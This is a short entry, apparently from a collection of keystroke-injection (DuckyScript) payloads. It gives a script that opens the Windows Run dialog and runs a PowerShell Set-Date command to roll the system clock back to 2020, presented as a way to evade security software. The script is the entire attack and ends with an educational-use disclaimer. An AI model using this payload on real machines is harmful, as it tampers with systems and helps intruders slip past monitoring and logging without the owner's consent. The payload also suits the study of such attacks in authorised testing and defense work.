# Modifying System Time to Evade Detection

Changes the system date and time to an earlier time, potentially evading detection from security software.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "Set-Date -Date '01/01/2020 12:00:00'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.